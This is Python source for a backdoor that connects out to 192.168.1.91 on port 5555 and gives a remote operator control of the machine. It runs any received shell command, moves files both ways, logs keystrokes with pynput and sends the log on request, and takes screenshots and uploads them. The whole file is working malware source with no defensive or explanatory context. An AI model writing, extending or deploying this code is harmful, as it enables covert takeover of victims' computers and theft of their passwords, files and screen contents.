import socket
import time
import subprocess
import json
import os
import threading
from pynput import keyboard
from PIL import ImageGrab

# Function to send data reliably
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

# Function to receive data reliably
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to maintain connection
def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.1.91', 5555))
            shell()
            s.close()
            break
        except:
            continue

# Function to upload files
def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

# Function to download files
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

# Keylogger function
def on_press(key):
    with open("keylog.txt", "a") as log:
        log.write(str(key) + '\n')

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Function to capture screen
def capture_screen():
    screen = ImageGrab.grab()
    screen.save("screenshot.png")
    upload_file("screenshot.png")
    os.remove("screenshot.png")

# Shell function
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command == 'keylog_start':
            keylog_thread = threading.Thread(target=start_keylogger)
            keylog_thread.start()
        elif command == 'keylog_dump':
            try:
                with open("keylog.txt", "r") as f:
                    reliable_send(f.read())
            except FileNotFoundError:
                reliable_send("No keylog data found.")
        elif command == 'screenshot':
            capture_screen()
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()